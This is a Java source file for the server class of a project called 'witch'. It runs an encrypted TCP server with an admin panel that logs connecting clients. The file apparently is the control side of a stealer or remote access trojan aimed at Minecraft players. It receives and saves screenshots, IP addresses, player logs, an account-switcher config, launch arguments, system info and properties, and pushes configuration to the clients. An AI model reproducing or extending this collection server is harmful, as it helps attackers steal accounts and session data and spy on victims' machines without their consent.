package me.soda.witch.server.server;

import com.google.gson.Gson;
import me.soda.witch.server.gui.AdminPanel;
import me.soda.witch.server.gui.GUI;
import me.soda.witch.server.utils.Info;
import me.soda.witch.server.utils.Utils;
import me.soda.witch.shared.Crypto;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.socket.Connection;
import me.soda.witch.shared.socket.TcpServer;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.messages.*;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.ConcurrentHashMap;

public class Server extends TcpServer {
    private static final Gson GSON = new Gson();
    public final ConcurrentHashMap<Connection, Info> clientMap = new ConcurrentHashMap<>();
    protected final ClientConfigData clientDefaultConf = Utils.getDefaultClientConfig();
    protected final ServerConfig config = Utils.getServerConfig();
    private final GUI gui;
    private final AdminPanel adminPanel;
    private int clientIndex = 0;

    public Server() throws IOException {
        super();
        adminPanel = new AdminPanel(this);
        gui = new GUI(adminPanel);
        gui.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                try {
                    stop();
                } catch (IOException ex) {
                    JOptionPane.showConfirmDialog(gui, ex.getMessage(), "Failed to stop server", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
                    System.exit(1);
                }
            }
        });

        log("--@@@@@@@ By Soda5601 @@@@@@@--");
        log("Server Config: %s", GSON.toJson(config));
        log("Client Config: %s", GSON.toJson(clientDefaultConf));
        log("Server started on %d", config.port);
        Crypto.INSTANCE = new Crypto(config.encryptionKey.getBytes());

        start(config.port);
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }

    @Override
    public void onOpen(Connection conn) {
        String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
        log("Client connected: %s ID: %d", address, clientIndex);
        clientMap.put(conn, new Info(clientIndex));
        adminPanel.connTableModel.addRow(new Object[]{clientIndex, null, null});
        clientIndex++;
    }

    @Override
    public void onMessage(Connection conn, Message message) {
        Info info = clientMap.get(conn);
        int id = info.id;
        try {
            if (message.data instanceof ByteData data) {
                switch (data.id) {
                    case "screenshot", "screenshot2" -> {
                        File file = new File(Utils.getDataFile("screenshots"), getFileName(data.id + "id", "png", String.valueOf(id), true));
                        FileUtil.write(file, data.bytes());
                    }
                    case "skin" -> {
                        String playerName = info.player.playerName;
                        File file = new File(Utils.getDataFile("skins"), getFileName(playerName, "png", String.valueOf(id), false));
                        FileUtil.write(file, data.bytes());
                    }
                }
            } else if (message.data instanceof StringsData data) {
                if (data.data().length == 0 && data.id().equals("getconfig")) {
                    conn.send(new Message(clientDefaultConf));
                } else if (data.data().length == 1) {
                    String msg = data.data()[0];
                    switch (data.id()) {
                        case "logging" -> {
                            File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
                            String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
                            FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
                        }
                        case "ip" -> {
                            info.ip = msg;
                            changeRow(info, false);
                        }
                        case "iasconfig", "runargs", "systeminfo", "props" -> {
                            File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.player.playerName, true));
                            FileUtil.write(file, msg);
                        }
                    }
                }
            } else if (message.data instanceof PlayerData data) {
                info.player = data;
                changeRow(info, false);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        log("Received message: %s From ID %d", message.data.getClass().getName(), id);
    }

    @Override
    public void onClose(Connection conn, DisconnectData disconnectData) {
        Info info = clientMap.get(conn);
        changeRow(info, true);
        log("Client disconnected: ID: %d", info.id);
        clientMap.remove(conn);
    }

    private void log(String str, Object... format) {
        adminPanel.console.append("[" + LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss.SS")) + "] " + String.format(str, format));
    }

    private void changeRow(Info info, boolean delete) {
        DefaultTableModel connTableModel = adminPanel.connTableModel;
        for (int i = 0; i < connTableModel.getRowCount(); i++) {
            int id = (int) connTableModel.getValueAt(i, 0);
            if (id == info.id) {
                if (delete) {
                    connTableModel.removeRow(i);
                    return;
                }

                connTableModel.setValueAt(info.ip, i, 1);
                connTableModel.setValueAt(info.player != null ? info.player.playerName : "", i, 2);
                return;
            }
        }
    }
}
